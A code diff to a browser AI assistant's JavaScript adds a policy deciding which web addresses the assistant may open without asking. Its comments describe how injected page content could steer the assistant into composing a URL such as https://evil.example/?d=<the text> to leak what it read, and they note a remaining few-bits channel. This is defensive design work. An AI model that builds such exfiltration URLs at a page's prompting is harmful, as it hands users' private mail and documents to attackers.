@@ -351,3 +351,67 @@ export function browserContext({ tab, title, url, selection }) {
   const json = JSON.stringify(data, null, 1).replace(/</g, "\\u003c").replace(/>/g, "\\u003e");
   return `<browser-context>\n${json}\n</browser-context>\n\n`;
 }
+
+// ---------------------------------------------------------------- addresses
+
+// open_url: whether the assistant may open an address without asking.
+// It reads pages (mail, documents), and a page can talk it into things, so an
+// address it composes is a way to hand what it read to someone else:
+// https://evil.example/?d=<the text>. Without asking it opens only what
+// somebody else wrote:
+//   - a site the user named in this chat (its host is in their messages);
+//   - an address it has seen exactly as is: an open tab, a page it read, a link
+//     on such a page;
+//   - a search in the user's search engine: a query is composed by nature and
+//     goes where the user's own queries go. Only the search page itself — search
+//     sites have redirect pages too.
+// Anything else asks, and the card shows the address.
+// A page can still list many addresses and have the assistant choose among
+// them: that carries a few bits per visit, not a mailbox.
+
+// An address as it is compared: without the #fragment. "" — not an address.
+export function urlKey(url) {
+  try {
+    const parsed = new URL(url);
+    parsed.hash = "";
+    return parsed.href;
+  } catch (e) {
+    return "";
+  }
+}
+
+// Whether a text names a host: as a whole name or as the end of a longer one
+// ("docs.example.com" names example.com; "notexample.com" and
+// "example.com.evil.org" don't).
+export function hostMentioned(text, host) {
+  if (!host) {
+    return false;
+  }
+  const escaped = host.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+  return new RegExp(`(^|[^a-z0-9-])${escaped}(?![a-z0-9-]|\\.[a-z0-9])`, "i").test(String(text));
+}
+
+// userTexts — what the user typed in this chat; seen — a Set of urlKey()s the
+// assistant was shown; searchUrl — any search in the user's search engine.
+export function urlAllowed(url, { userTexts = [], seen = new Set(), searchUrl = "" } = {}) {
+  let parsed;
+  try {
+    parsed = new URL(url);
+  } catch (e) {
+    return false;
+  }
+  if (!/^https?:$/.test(parsed.protocol) || parsed.username || parsed.password) {
+    return false;
+  }
+  if (seen.has(urlKey(url))) {
+    return true;
+  }
+  try {
+    const search = new URL(searchUrl);
+    if (parsed.origin === search.origin && parsed.pathname === search.pathname) {
+      return true;
+    }
+  } catch (e) {}
+  const host = parsed.hostname.toLowerCase().replace(/^www\./, "");
+  return userTexts.some(text => hostMentioned(text, host));
+}
